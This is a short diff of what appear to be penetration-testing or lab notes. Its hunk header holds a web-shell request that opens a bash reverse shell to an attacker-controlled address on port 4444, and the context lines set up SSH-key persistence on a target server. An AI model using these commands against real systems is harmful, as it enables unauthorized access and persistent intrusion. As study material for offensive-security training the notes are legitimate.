@@ -20,7 +20,7 @@ http://<target-ip>/404.php?cmd=bash -i >& /dev/tcp/<local-ip>/4444 0>&1
 # generate ssh keys
 ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa -N "PA$$word@123"
 
-# Install Public Key
+# Install Public Key to target server
 cat ~/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys
 
 # Set Permissions
